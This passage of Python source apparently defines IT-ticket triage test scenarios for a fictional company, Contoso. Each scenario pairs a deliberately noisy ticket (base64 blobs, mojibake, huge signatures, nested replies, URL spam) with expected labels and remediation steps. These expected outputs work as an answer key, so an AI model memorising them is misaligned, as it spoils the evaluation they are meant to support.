                "Investigate VPN authentication failure following password rotation for user "
                "Daniel Okafor. GlobalProtect 6.2.1 on Dell Latitude 7440 shows 'Invalid credentials' "
                "despite the new password working for all other services. Likely a cached credential "
                "or RADIUS/NPS token mismatch after the password change."
            ),
            remediation_steps=[
                "Clear cached VPN credentials in Windows Credential Manager and GlobalProtect client.",
                "Verify the user's account is not locked in Active Directory after failed VPN attempts.",
                "Check RADIUS/NPS logs for authentication rejection reason codes.",
                "Confirm the VPN gateway has synced with the updated password in AD (replication lag).",
                "If credential cache clear does not resolve, re-provision the GlobalProtect client profile.",
            ],
            reporter_name="Daniel Okafor",
            reporter_email="daniel.okafor@contoso.com",
            reporter_department="Institutional Trading",
            channel=Channel.EMAIL,
            tags=["data-cleanup", "very-long-email", "buried-issue", "forwarded-chain"],
            difficulty="hard",
        ),
        # ── DC-152  Multiple base64 images flooding the description ───────
        ScenarioDefinition(
            scenario_id="DC-152",
            subject="Monitor display glitch — photos attached inline",
            description=(
                "Hi IT,\n\n"
                "My external monitor has weird colored lines across the top third of the screen. "
                "It started this morning after a Windows Update. I took several photos:\n\n"
                "[Photo 1 - full screen showing glitch]\n"
                "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAABAAAAQCYAAD/qcomAAAABHNCSVQICAgIfAhkiA"
                "AAAAlwSFlzAAALEwAACxMBAJqcGAAAAAd0SU1FB9oKFwgMNC3WkXYAACAASURBVHic7d15fFT1vf/x95lsk5ns"
                "G0kgCQlhCfsSAoooLohi3bV1adXaam/dWm1rW2uXW7u4tXZR691s7WLdam3rVq24sIjsyCb7FiAhIfu+Tc7v"
                "j0kIIZOQhExmJnk9H495nDlnzsx8k8Mj8p7v9/s1TNOUJFVVVen48eOqqamRw+FQXFycMjIylJubq6ioqP+u"
                "xznSaJ7jjvqYJlFRqJhkzHhJWtVQdP79/etqJi0KbkdEBQXkYVQ87q+K7V+xtRZRlTo86hdn4xHrs6cDKi8q"
                "3xGPRK1bJ0kVpnZQ2mNkYdfqPawzKhnlKoUYcE53MKSgf5ni1rfXeczvBEnwXPZAV2ZyqjPZjwgTu6avzxF0"
                "VlqMGpVpbxBq6Kv2flat295CvN5VncZ5FscawtkrhrZtfSx0TWDAmYUZ4x3MvnNSBpW7ttz7ajGVwIMds/eyB"
                "34XShI8aumU33avwm67YOC2RmWXJ8ErkiNbVmgKoKXiZEGnwpYQ==\n\n"
                "[Photo 2 - close-up of colored lines]\n"
                "data:image/jpeg;base64,/9j/4AAQSkZJRgABAQEASABIAAD/2wBDAAgGBgcGBQgHBwcJCQgKDBQNDAsLDB"
                "kSEw8UHRofHh0aHBwgJC4nICIsIxwcKDcpLDAxNDQ0Hyc5PTgyPC4zNDL/2wBDAQkJCQwLDBgNDRgyIRwhMj"
                "IyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjL/wAARCAEAAQADASIA"
                "AhEBAxEB/8QAHwAAAQUBAQEBAQEAAAAAAACDAwQFBgcICQoL/8QAtRAAAgEDAwIEAwUFBAQAAAF9AQIDAAQRB"
                "RIhMUEGE1FhByJxFDKBkaEII0KxwRVS0fAkM2JyggkKFhcYGRolJicoKSo0NTY3ODk6Q0RFRkdISUpTVFVW"
                "V1hZWmNkZWZnaGlqc3R1dnd4eXqDhIWGh4iJipKTlJWWl5iZmqKjpKWmp6ipqrKztLW2t7i5usLDxMXGx8"
                "jJytLT1NXW19jZ2uHi4+Tl5ufAAAAA0aHR/9oADAMBAAIRAxEAPwD0H7V4f8VGBQdRSQkkkkk==\n\n"
                "[Photo 3 - back of monitor showing connections]\n"
                "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAoAAAAKCAYAAACNMs+9AAAAFUlEQVQYV2P8z8BQ"
                "z0AEYBxVOHIVAvcHBQHzKSECAAAAAElFTkSuQmCCiVBORw0KGgoAAAANSUhEUgAAAAoAAAAKCAYAAACNMs+9AA"
                "AAFUlEQVQYV2P8z8BQz0AEYBxVOHIVAvcHBQHzKSECAAAAAElFTkSuQmCCiVBORw0KGgoAAAANSUhEUgAAAAo"
                "AAAAKCAYAAACNMs+9AAAAFUlEQVQYV2P8z8BQz0AEYBxVOHIVAvcHBQHzKSECAAAAAElFTkSuQmCCXttzQ7a"
                "jGVwI7tMds9eyB34XShI8aumU33avwm67YOC2RmWXJ8Erk6iNbVmgKoKXiZEGnwpYQkp36HSzKQ==\n\n"
                "[Photo 4 - Device Manager showing display adapter]\n"
                "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAABHNCSVQICAgIfAhk"
                "iAAAAAlwSFlzAAALEwAACxMBAJqcGAAAAAd0SU1FB9oKFwgMNC3WkXYAAAAAElFTkSuQmCCiVBORw0KGgoAAA"
                "ANSUhEUgAAACAAAAAgCAYAAABzenr0AAAABHNCSVQICAgIfAhkiAAAAAlwSFlzAAALEwAACxMBAJqcGAAAAAdO"
                "SU1FB9oKFwgMNC3WkXYAAAAAElFTkSuQmCCBQHzKSECAAAAAElFTkSuQmCCXttzQ7ajGVwI7tMds9eyB34XS"
                "hI8aumU33avwm67YOC2RmWXJ8Erk6iNbVmgKoKXiZEGnwpYQkp36HSzKQFOnCLJ++uV885zMu8+aw==\n\n"
                "[Photo 5 - screen after reboot showing same issue]\n"
                "data:image/jpeg;base64,/9j/4AAQSkZJRgABAQEASABIAADkBSyluO9K2kbzlh9UISyz5DwgdKTjYDu/ns"
                "6nYeuGwyQpl1+qwx5ie3TmN3/i+Cf5U6chw+nBnf/JPX6P0D7nREDEUfQ+OWKoUYcE53MKSgf5ni1rfXecz"
                "vBEnwXPZAVyqjPZjwgTu6avzxFZNox0VlqMGpVpbxBq/6Kv2flat295Cv7+N5VncZ5FscawtkrhrZtfSx+0T"
                "WDAmY/UZ4x3MvnNSBpW7ttz7ajGVwIMds/eyB34XShI+8aumU33avwm67YOC2RmWXJ8ErkiNbVmg+KoKXiZE"
                "GnwpYQkp36HSzKQFOnCLJ++uV885zMu8+awDzG+5bM83qKS38Aw/o05UKEz1MfCbfc8Y3AM==\n\n"
                "The monitor is a Dell U2723QE connected via USB-C. This is in the Singapore office, "
                "Building 6, 3rd floor. The GPU is Intel Iris Xe integrated. I already tried "
                "unplugging and replugging the USB-C cable.\n\n"
                "Thanks,\nMei-Lin Tan"
            ),
            category=Category.HARDWARE,
            priority=Priority.P3,
            team=Team.ENDPOINT,
            needs_escalation=False,
            missing_info=[MissingInfo.DEVICE_INFO],
            next_best_action=(
                "Investigate display artifacts (colored lines) on Dell U2723QE connected via USB-C "
                "following a Windows Update. The five inline base64 image fragments should be ignored. "
                "The actual issue points to a possible display driver regression."
            ),
            remediation_steps=[
                "Roll back the most recent Intel Iris Xe display driver update via Device Manager.",
                "Test the monitor with a different cable (DisplayPort or HDMI) to rule out USB-C issues.",
                "Check for known issues with the latest Windows Update and Intel Iris Xe drivers.",
                "If driver rollback resolves the issue, pin the known-good driver version via Intune.",
                "Test with a different monitor to isolate whether the issue is GPU or panel related.",
            ],
            reporter_name="Mei-Lin Tan",
            reporter_email="mei-lin.tan@contoso.com",
            reporter_department="Equity Trading",
            channel=Channel.EMAIL,
            tags=["data-cleanup", "base64-flood", "multiple-images", "inline-binary"],
            difficulty="hard",
        ),
        # ── DC-153  Base64-encoded log data (not an image) ────────────────
        ScenarioDefinition(
            scenario_id="DC-153",
            subject="Application crash — encoded error log attached",
            description=(
                "Hi team,\n\n"
                "Our Java trade reconciliation app keeps crashing with an OutOfMemoryError. I exported "
                "the error log but my email client encoded it. Here is the log data:\n\n"
                "RVJST1IgMjAyNi0wMy0xOCAwOToxNToyMiBbQXV0aE1vZHVsZV0gRmFpbGVkIHRvIHZhbGlkYXRl"
                "IE1GQSB0b2tlbiBmb3IgdXNlciBzYXJhaC5jaGVuQGNvbnRvc28uY29tLiBUb2tlbiBleHBpcmVkIGF0"
                "IDIwMjYtMDMtMThUMDk6MTA6MDBaLiBSZXRyeSBjb3VudDogMy4gTW9kdWxlOiBBenVyZUFELk1GQS5W"
                "YWxpZGF0b3IuIENvcnJlbGF0aW9uSWQ6IGE4ZjNjMmUxLTRiNWQtNGY2YS04YzlkLTBlMWYyYTNiNGM1"
                "ZGNBdRVM6FDx2/sW33OIeLh8DG8vQpIB8WGumYZbW04hDCs1DXmWgketP07qWifhgu3OygIkC6N1rWz9nD"
                "heC4DA5ap5U/gdlJb5sUj+T3JdQS7ya1etZK9tyJ1B9vxDytuhaNT1qW+xWWiWQKPK3tbKjbKPA5A8bDEM"
                "CiUa9v+8kDsipa6uvzyS4fitsGSSR08JJwmh8Q==\n\n"
                "Y29udG9zby10cmFkZS1yZWNvbi1hcHAvdjQuMi4xCmphdmEubGFuZy5PdXRPZk1lbW9yeUVycm9yOiAi"
                "SmF2YSBoZWFwIHNwYWNlIgogIGF0IGNvbS5jb250b3NvLnRyYWRlLlJlY29uRW5naW5lLnByb2Nlc3NC"
                "YXRjaChSZWNvbkVuZ2luZS5qYXZhOjI4NykKICBhdCBjb20uY29udG9zby50cmFkZS5TY2hlZHVsZXIu"
                "cnVuRGFpbHlSZWNvbihTY2hlZHVsZXIuamF2YToxNDIpCiAgYXQgamF2YS51dGlsLmNvbmN1cnJlbnQu"
                "VGhyZWFkUG9vbEV4ZWN1dG9yLnJ1bldvcmtlcg==\n\n"
                "The app runs on srv-trade-recon-01 (Windows Server 2022) with 16 GB RAM allocated to "
                "the JVM. The crash happens every morning around 09:15 when the batch reconciliation "
                "job processes the overnight US equity trades — about 450,000 records.\n\n"
                "Can you look into increasing the heap size or optimizing the batch processing?\n\n"
                "Thanks,\nRobert Chen\nTrade Operations"
            ),
            category=Category.SOFTWARE,
            priority=Priority.P2,
            team=Team.ENTERPRISE_APPS,
            needs_escalation=False,
            missing_info=[MissingInfo.ENVIRONMENT_DETAILS, MissingInfo.STEPS_TO_REPRODUCE],
            next_best_action=(
                "Investigate Java OutOfMemoryError in the trade reconciliation application on "
                "srv-trade-recon-01. The base64-encoded log fragments in the ticket should be "
                "ignored — the key issue is heap exhaustion during the morning batch processing "
                "of ~450,000 US equity trade records."
            ),
            remediation_steps=[
                "Review JVM heap allocation (-Xmx) on srv-trade-recon-01 and increase if below recommended threshold.",
                "Analyze heap dump to identify memory-intensive objects during batch reconciliation.",
                "Check if the batch can be processed in smaller chunks to reduce peak memory usage.",
                "Verify there are no memory leaks in the ReconEngine.processBatch method.",
                "Consider upgrading to a larger instance or adding swap space as a short-term mitigation.",
            ],
            reporter_name="Robert Chen",
            reporter_email="robert.chen@contoso.com",
            reporter_department="Operations",
            channel=Channel.EMAIL,
            tags=["data-cleanup", "base64-encoded-text", "error-log", "application-crash"],
            difficulty="medium",
        ),
        # ── DC-154  Giant email signature dwarfing the actual issue ────────
        ScenarioDefinition(
            scenario_id="DC-154",
            subject="MFA not working",
            description=(
                "Hi, my MFA push notifications stopped working this morning. The Authenticator app "
                "just spins and then says 'Request timed out'. I can't log into anything.\n\n"
                "Raj Patel\nSenior Vice President, Wealth Management\nContoso Financial Services\n\n"
                "Direct: +1 (212) 555-0391 | Mobile: +1 (917) 555-0248 | Fax: +1 (212) 555-0392\n"
                "Email: raj.patel@contoso.com\n"
                "200 Park Avenue, 42nd Floor, New York, NY 10166\n"
                "Executive Assistant: Martha Wilson — martha.wilson@contoso.com, +1 (212) 555-0393\n\n"
                "LinkedIn: linkedin.com/in/rajpatel-contoso\n"
                "Bloomberg: RPATEL@CONTOSO | Reuters: raj.patel.contoso\n\n"
                "\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501"
                "\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501"
                "\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n\n"
                "IMPORTANT LEGAL DISCLAIMER\n\n"
                "This email is sent by Contoso Financial Services and/or its subsidiaries and affiliates "
                "(collectively, 'Contoso'). This email may contain confidential, proprietary, or legally "
                "privileged information. It is intended solely for the use of the individual or entity to "
                "whom it is addressed. If you are not the named addressee, you should not disseminate, "
                "distribute, or copy this email. Please notify the sender immediately by email if you have "
                "received this email by mistake, and delete this email from your system. Email transmission "
                "cannot be guaranteed to be secure or error-free, as information could be intercepted, "
                "corrupted, lost, destroyed, arrive late or incomplete, or contain viruses. The sender "
                "therefore does not accept liability for any errors or omissions in the contents of this "
                "message which arise as a result of email transmission.\n\n"
                "REGULATORY INFORMATION\n\n"
                "Contoso Financial Services is authorized and regulated by the Financial Conduct Authority "
                "(FCA) under firm reference number 123456. Registered in England and Wales under company "
                "number 12345678. Registered office: 200 Park Avenue, New York, NY 10166. Contoso "
                "Financial Services is a member of the Financial Industry Regulatory Authority (FINRA), "
                "the Securities Investor Protection Corporation (SIPC), and the National Futures "
                "Association (NFA). NFA ID: 0123456.\n\n"
                "ENVIRONMENTAL NOTICE\n\n"
                "\u267b Please consider the environment before printing this email. Contoso Financial "
                "Services is committed to sustainability and responsible environmental stewardship. We "
                "have pledged to achieve net-zero carbon emissions by 2035 as part of our ESG commitment. "
                "Learn more at www.contoso.com/esg.\n\n"
                "PRIVACY NOTICE\n\n"
                "Contoso Financial Services processes personal data in accordance with applicable data "
                "protection legislation, including GDPR, CCPA, and other regional privacy laws. For "
                "information about how we collect, use, and protect your personal data, please refer to "
                "our Privacy Policy at www.contoso.com/privacy. To exercise your data subject rights or "
                "lodge a complaint, please contact our Data Protection Officer at dpo@contoso.com.\n\n"
                "TAX DISCLAIMER\n\n"
                "Any tax advice contained in this communication (including any attachments) was not "
                "intended or written to be used, and cannot be used, for the purpose of (i) avoiding "
                "tax-related penalties under the Internal Revenue Code or (ii) promoting, marketing, or "
                "recommending to another party any matters addressed herein.\n\n"
                "ANTI-MONEY LAUNDERING NOTICE\n\n"
                "Contoso Financial Services is committed to combating money laundering and terrorist "
                "financing. We conduct customer due diligence in compliance with the Bank Secrecy Act, "
                "USA PATRIOT Act, and applicable anti-money laundering regulations.\n\n"
                "IRS CIRCULAR 230 DISCLOSURE\n\n"
                "To ensure compliance with requirements imposed by the IRS, we inform you that any U.S. "
                "federal tax advice contained in this communication (including any attachments) is not "
                "intended or written to be used, and cannot be used, for the purpose of (i) avoiding "
                "penalties under the Internal Revenue Code or (ii) promoting, marketing, or recommending "
                "to another party any transaction or matter addressed herein."
            ),
            category=Category.ACCESS_AUTH,
            priority=Priority.P2,
            team=Team.IAM,
            needs_escalation=False,
            missing_info=[MissingInfo.ERROR_MESSAGE, MissingInfo.DEVICE_INFO],
            next_best_action=(
                "Investigate MFA push notification timeout for user Raj Patel. The Authenticator "
                "app shows 'Request timed out' — ignore the massive legal/regulatory signature "
                "block. Check Azure AD MFA service status and the user's registered devices."
            ),
            remediation_steps=[
                "Check Azure AD MFA service health for any ongoing outages.",
                "Verify the user's Authenticator app registration is still valid in Azure AD.",
                "Check if the user's device has internet connectivity and push notifications enabled.",
                "Re-register the Authenticator app if the existing registration is stale.",
                "Issue a temporary access pass so the user can log in while MFA is being resolved.",
            ],
            reporter_name="Raj Patel",
            reporter_email="raj.patel@contoso.com",
            reporter_department="Wealth Management",
            channel=Channel.EMAIL,
            tags=["data-cleanup", "giant-signature", "legal-disclaimer", "buried-issue"],
            difficulty="medium",
        ),
        # ── DC-155  Extremely deep reply chain with > quoting ─────────────
        ScenarioDefinition(
            scenario_id="DC-155",
            subject="Re: Re: Re: Re: Re: Re: Re: Re: Re: Re: Re: Printer jam Floor 7",
            description=(
                "Update: the printer is jamming again today. Same tray 2 issue. Can someone please "
                "come look at it? The paper keeps folding at the output.\n\n"
                "> On Mar 19 at 3:12 PM, Kevin Park wrote:\n"
                "> I cleared the jam and it printed fine for the rest of the afternoon.\n"
                "> Let me know if it happens again.\n"
                ">\n"
                "> > On Mar 19 at 1:45 PM, Janet Kim wrote:\n"
                "> > It just jammed again. Third time today. Tray 2 every time.\n"
                "> >\n"
                "> > > On Mar 19 at 11:30 AM, Kevin Park wrote:\n"
                "> > > Thanks Janet. I've ordered replacement rollers for Tray 2. ETA is\n"
                "> > > Thursday. In the meantime, try using Tray 1 or Tray 3.\n"
                "> > >\n"
                "> > > > On Mar 19 at 10:15 AM, Janet Kim wrote:\n"
                "> > > > Still jamming. I opened the front panel and saw a small piece of\n"
                "> > > > torn paper stuck near the fuser unit. I couldn't reach it.\n"
                "> > > >\n"
                "> > > > > On Mar 18 at 4:45 PM, Kevin Park wrote:\n"
                "> > > > > I cleaned the feed rollers and ran 10 test pages. All printed\n"
                "> > > > > fine. Please test tomorrow and let me know.\n"
                "> > > > >\n"
                "> > > > > > On Mar 18 at 3:30 PM, Janet Kim wrote:\n"
                "> > > > > > Still happening. I counted 7 jams today. The entire floor\n"
                "> > > > > > is complaining. We might need a replacement printer.\n"
                "> > > > > >\n"
                "> > > > > > > On Mar 18 at 2:00 PM, Help Desk wrote:\n"
                "> > > > > > > We've dispatched Kevin from Endpoint Engineering. He\n"
                "> > > > > > > should arrive within the hour.\n"
                "> > > > > > >\n"
                "> > > > > > > > On Mar 18 at 1:15 PM, Janet Kim wrote:\n"
                "> > > > > > > > The paper keeps jamming in Tray 2 of the HP LaserJet\n"
                "> > > > > > > > Enterprise M609 on Floor 7, near conference room 7B.\n"
                "> > > > > > > > Asset tag: WM-PRN-0891. It jams every 4-5 pages.\n"
                "> > > > > > > >\n"
                "> > > > > > > > > On Mar 18 at 12:30 PM, Janet Kim wrote:\n"
                "> > > > > > > > > Printer on Floor 7 is jamming. Please help.\n"
                "> > > > > > > > >\n"
                "> > > > > > > > > > On Mar 18 at 11:00 AM, Auto-Attendant wrote:\n"
                "> > > > > > > > > > Your ticket has been received. Ticket ID: INC-4901.\n"
                "> > > > > > > > > > A technician will respond within 2 hours.\n"
                "> > > > > > > > > >\n"
                "> > > > > > > > > > > On Mar 18 at 10:55 AM, Janet Kim wrote:\n"
                "> > > > > > > > > > > Initial report: printer floor 7 jamming constantly.\n"
                "> > > > > > > > > > > Need someone to look at it today.\n"
            ),
            category=Category.HARDWARE,
            priority=Priority.P3,
            team=Team.ENDPOINT,
            needs_escalation=False,
            missing_info=[MissingInfo.DEVICE_INFO],
            next_best_action=(
                "Recurring paper jam in Tray 2 of HP LaserJet Enterprise M609 on Floor 7 "
                "(asset tag WM-PRN-0891). The 15-level-deep reply chain shows the issue persists "
                "despite roller cleaning and paper fragment removal. Replacement feed rollers "
                "ordered but have not arrived. The fuser area may also need inspection."
            ),
            remediation_steps=[
                "Expedite the replacement Tray 2 feed rollers and install as soon as they arrive.",
                "Inspect the fuser unit area for the torn paper fragment reported by the user.",
                "Run a full print path cleaning cycle from the printer service menu.",
                "Check paper stock quality and orientation in Tray 2 (correct weight and size).",
                "If jam persists after roller replacement, schedule a full service call with HP.",
            ],
            reporter_name="Janet Kim",
            reporter_email="janet.kim@contoso.com",
            reporter_department="Wealth Management",
            channel=Channel.EMAIL,
            tags=["data-cleanup", "deep-quoting", "reply-chain", "excessive-nesting"],
            difficulty="hard",
        ),
        # ── DC-156  Garbled encoding (mojibake) scattered in real text ────
        ScenarioDefinition(
            scenario_id="DC-156",
            subject="Can\u00e2\u0080\u0099t access shared drive \u00e2\u0080\u0094 permission denied",
            description=(
                "Hi IT,\n\n"
                "I\u00e2\u0080\u0099m getting a \u00e2\u0080\u009cpermission denied\u00e2\u0080\u009d "
                "error when trying to access the shared drive \\\\fs-london-01\\wealth-mgmt\\reports. "
                "This worked fine until yesterday. I need access to the Q1 2026 portfolio valuation "
                "files for a client meeting at 2 PM today.\n\n"
                "The error message says: \u00e2\u0080\u009cYou do not have permission to access "
                "\\\\fs-london-01\\wealth-mgmt\\reports. Contact your network administrator to "
                "request access.\u00e2\u0080\u009d\n\n"
                "I\u00e2\u0080\u0099ve been using this share for 3 years with no issues. My "
                "colleague Ã\u0089lodie Martin on the same team can still access it. We\u00e2\u0080\u0099re "
                "both in the London office, Building 2, 4th floor. My Windows login is CONTOSO\\a.williams "
                "and my computer is a Lenovo ThinkPad T14 Gen 4.\n\n"
                "I also noticed the folder name appears garbled in File Explorer \u00e2\u0080\u0094 it shows "
                "as \u00e2\u0080\u009cQ1_2026_ValuÃ¤tion_RepÃ¶rts\u00e2\u0080\u009d instead of "
                "\u00e2\u0080\u009cQ1_2026_Valuation_Reports\u00e2\u0080\u009d. Not sure if that\u00e2\u0080\u0099s "
                "related.\n\n"
                "Please fix ASAP \u00e2\u0080\u0094 this is urgent.\n\n"
                "Thanks,\nAlicia Williams\nPortfolio Manager\nContoso Wealth Management \u00c2\u00a9 2026"
            ),
            category=Category.DATA_STORAGE,
            priority=Priority.P3,
            team=Team.DATA_PLATFORM,
            needs_escalation=False,
            missing_info=[MissingInfo.AFFECTED_SYSTEM, MissingInfo.NETWORK_LOCATION],
            next_best_action=(
                "Investigate file share access denial for user CONTOSO\\a.williams on "
                "\\\\fs-london-01\\wealth-mgmt\\reports. The mojibake in the ticket "
                "(garbled UTF-8 double-encoding) should be ignored — the core issue is "
                "a sudden loss of read access to a share the user previously had."
            ),
            remediation_steps=[
                "Check the user's Active Directory group membership for the wealth-mgmt share ACL.",
                "Review recent changes to the file server's share/NTFS permissions.",
                "Verify the user's Kerberos ticket is valid and not expired.",
                "Compare the user's access token with colleague Élodie Martin's for differences.",
                "If permissions look correct, try resetting the user's computer SMB session (net use /delete).",
            ],
            reporter_name="Alicia Williams",
            reporter_email="alicia.williams@contoso.com",
            reporter_department="Portfolio Management",
            channel=Channel.EMAIL,
            tags=["data-cleanup", "mojibake-severe", "encoding-corruption", "scattered-garble"],
            difficulty="medium",
        ),
        # ── DC-157  Massive JSON config dump pasted inline ────────────────
        ScenarioDefinition(
            scenario_id="DC-157",
            subject="Azure deployment failed — ARM template included",
            description=(
                "Hi team,\n\n"
                "Our deployment to the staging environment failed with a timeout error. I'm pasting "
                "the ARM template so you can see the configuration:\n\n"
                '{"$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#", '
                '"contentVersion": "1.0.0.0", '
                '"parameters": {"environment": {"type": "string", "defaultValue": "staging", '
                '"allowedValues": ["dev", "staging", "prod"]}, '
                '"vmSize": {"type": "string", "defaultValue": "Standard_D4s_v3"}, '
                '"location": {"type": "string", "defaultValue": "[resourceGroup().location]"}, '
                '"adminUsername": {"type": "string", "defaultValue": "contosoadmin"}, '
                '"vnetAddressPrefix": {"type": "string", "defaultValue": "10.0.0.0/16"}, '
                '"subnetPrefix": {"type": "string", "defaultValue": "10.0.1.0/24"}, '
                '"storageAccountType": {"type": "string", "defaultValue": "Standard_LRS"}, '
                '"diagnosticsStorageAccountName": {"type": "string"}, '
                '"networkSecurityGroupName": {"type": "string", "defaultValue": "staging-nsg"}, '
                '"applicationGatewayName": {"type": "string", "defaultValue": "staging-appgw"}, '
                '"loadBalancerName": {"type": "string", "defaultValue": "staging-lb"}, '
                '"publicIPAddressName": {"type": "string", "defaultValue": "staging-pip"}, '
                '"dnsLabelPrefix": {"type": "string", "defaultValue": "contoso-staging"}}, '
                '"variables": {"nicName": "[concat(parameters(\'environment\'), \'-nic\')]", '
                "\"vnetName\": \"[concat(parameters('environment'), '-vnet')]\", "
                '"subnetName": "default", '
                '"subnetRef": "[resourceId(\'Microsoft.Network/virtualNetworks/subnets\','
                " variables('vnetName'), variables('subnetName'))]\", "
                "\"vmName\": \"[concat('vm-trade-recon-', parameters('environment'))]\", "
                "\"osDiskName\": \"[concat(variables('vmName'), '-osdisk')]\", "
                "\"dataDiskName\": \"[concat(variables('vmName'), '-datadisk')]\"}, "
                '"resources": [{"type": "Microsoft.Network/virtualNetworks", "apiVersion": "2023-05-01", '
                '"name": "[variables(\'vnetName\')]", "location": "[parameters(\'location\')]", '
                '"properties": {"addressSpace": {"addressPrefixes": ["[parameters(\'vnetAddressPrefix\')]"]}, '
                '"subnets": [{"name": "[variables(\'subnetName\')]", '
                '"properties": {"addressPrefix": "[parameters(\'subnetPrefix\')]"}}]}}]}\n\n'
                "The deployment ran for 45 minutes and then timed out. The last status was "
                "'Microsoft.Network/virtualNetworks - Creating'. This is the trade reconciliation "
                "staging environment — we need it before Thursday's UAT session.\n\n"
                "Error from Azure CLI:\nERROR: Deployment failed. Correlation ID: "
                "d8f3c2e1-4b5d-4f6a-8c9d-0e1f2a3b4c5d. ProvisioningState: TimedOut.\n\n"
                "Thanks,\nNora Fischer\nCloud Infrastructure"
            ),
            category=Category.SOFTWARE,
            priority=Priority.P2,
            team=Team.ENTERPRISE_APPS,
            needs_escalation=False,
            missing_info=[MissingInfo.ERROR_MESSAGE, MissingInfo.ENVIRONMENT_DETAILS],
            next_best_action=(
                "Investigate Azure ARM template deployment timeout for the trade reconciliation "
                "staging environment. The inline JSON ARM template is noise — the real issue is "
                "a VNet creation timeout. Check Azure subscription quotas and region capacity."
            ),
            remediation_steps=[
                "Check Azure subscription resource quotas for the target region and resource group.",
                "Review Azure Activity Log for the deployment correlation ID to identify the root failure.",
                "Verify that the target region has capacity for the requested VM size (Standard_D4s_v3).",
                "Retry the deployment with a longer timeout or deploy resources incrementally.",
                "Check for Azure service health issues in the target region at status.azure.com.",
            ],
            reporter_name="Nora Fischer",
            reporter_email="nora.fischer@contoso.com",
            reporter_department="Cloud Infrastructure",
            channel=Channel.PORTAL,
            tags=["data-cleanup", "json-config-dump", "inline-config", "deployment-issue"],
            difficulty="hard",
        ),
        # ── DC-158  Mixed language code-switching ─────────────────────────
        ScenarioDefinition(
            scenario_id="DC-158",
            subject=(
                "Email delivery delay \u2014 correo electr\u00f3nico no llega / \u7535\u5b50\u90ae\u4ef6\u5ef6\u8fdf"
            ),
            description=(
                "\u4f60\u597d IT \u56e2\u961f,\n\n"
                "I'm having a problem with email delivery delays. \u6211\u7684\u7535\u5b50\u90ae\u4ef6\u53d1\u9001"
                "\u540e\u8981\u7b49\u5f88\u4e45\u624d\u80fd\u5230\u8fbe\u6536\u4ef6\u4eba\u90a3\u91cc "
                "(sometimes 30-40 minutes instead of seconds).\n\n"
                "Esto est\u00e1 afectando a nuestro equipo de trading en la oficina de Singapore. "
                "We have clients in Hong Kong, Shanghai, and Tokyo who are complaining about "
                "slow responses. Los correos internos tambi\u00e9n est\u00e1n lentos.\n\n"
                "\u95ee\u9898\u4ece\u4e0a\u5468\u4e94\u5f00\u59cb\u7684. It seems like external emails "
                "are affected more than internal. Mi colega Javier not\u00f3 el mismo problema on "
                "his laptop. \u6211\u4eec\u7528\u7684\u662f Outlook 2024 on Windows 11.\n\n"
                "Podemos hacer una llamada? \u6211\u7684\u624b\u673a\u53f7\u7801 is +65 9123 4567. "
                "We need this fixed before the Asian markets open on Monday.\n\n"
                "\u8c22\u8c22 / Gracias / Thanks,\nWei-Chen Huang\n"
                "VP, Cross-Border Trading\nContoso Financial Services \u2014 Singapore"
            ),
            category=Category.SOFTWARE,
            priority=Priority.P3,
            team=Team.ENTERPRISE_APPS,
            needs_escalation=False,
            missing_info=[MissingInfo.AFFECTED_USERS, MissingInfo.TIMESTAMP],
            next_best_action=(
                "Investigate email delivery delays (30-40 minutes) affecting the Singapore "
                "trading team. The trilingual code-switching (English/Chinese/Spanish) should "
                "be ignored — the real issue is Exchange/Outlook delivery latency impacting "
                "client communications across the Asia-Pacific region."
            ),
            remediation_steps=[
                "Check Exchange Online message trace for the user's recent emails to identify delivery bottlenecks.",
                "Review mail flow rules and connectors for the Singapore office that may introduce delays.",
                "Check if the issue correlates with specific recipient domains or external vs. internal routing.",
                "Investigate Exchange transport queue health and any throttling policies in effect.",
                "Verify DNS MX record resolution times from the Singapore office network.",
            ],
            reporter_name="Wei-Chen Huang",
            reporter_email="wei-chen.huang@contoso.com",
            reporter_department="Institutional Trading",
            channel=Channel.EMAIL,
            tags=["data-cleanup", "code-switching", "multilingual-mixed", "trilingual"],
            difficulty="hard",
        ),
        # ── DC-159  Embedded URL spam (30+ tracking URLs) ─────────────────
        ScenarioDefinition(
            scenario_id="DC-159",
            subject="FW: SharePoint sync broken + newsletter",
            description=(
                "Hi, forwarding my original request that got buried in a newsletter email.\n\n"
                "My OneDrive for Business stopped syncing with SharePoint. The sync icon shows a red X "
                "and the tooltip says 'Sync pending'. I have about 2 GB of files waiting to upload.\n\n"
                "--- Forwarded from Contoso Weekly Newsletter ---\n\n"
                "CONTOSO FINANCIAL SERVICES WEEKLY UPDATE\n"
                "Read online: https://contoso.com/newsletter?utm_source=email&utm_medium=internal"
                "&utm_campaign=weekly_update_2026_w12&utm_content=header_link&mkt_tok=NDc2LVRYUS0xNzQA"
                "AAGSfDz_KL4p2&trk=nnnn\n\n"
                "Top Stories This Week:\n"
                "1. Q1 Results Preview https://contoso.com/news/q1-preview?ref=newsletter&sid=abc123"
                "&utm_source=internal&utm_medium=email&utm_campaign=q1_preview&click_id=x7y8z9\n"
                "2. New Singapore Office https://contoso.com/news/sg-office?ref=newsletter&sid=def456"
                "&utm_source=internal&utm_medium=email&campaign=sg_office&mkt_tok=encoded_string_here\n"
                "3. ESG Report Published https://contoso.com/esg/report-2025?utm_source=email"
                "&utm_medium=newsletter&utm_campaign=esg2025&utm_term=sustainability&trk=mmm\n"
                "4. Technology Update https://contoso.com/tech/update?ref=weekly_12&sid=ghi789"
                "&utm_source=internal&utm_medium=email&mkt_tok=another_token_here&click=zzzz\n"
                "5. Compliance Training https://contoso.com/compliance/training?session=2026Q2"
                "&utm_source=email&utm_medium=newsletter&campaign=compliance_q2&trk=pppp\n\n"
                "UPCOMING EVENTS:\n"
                "- Town Hall: https://contoso.com/events/townhall?id=TH2026-03&register=true"
                "&utm_source=email&campaign=townhall_mar&mkt_tok=token123&ref=newsletter\n"
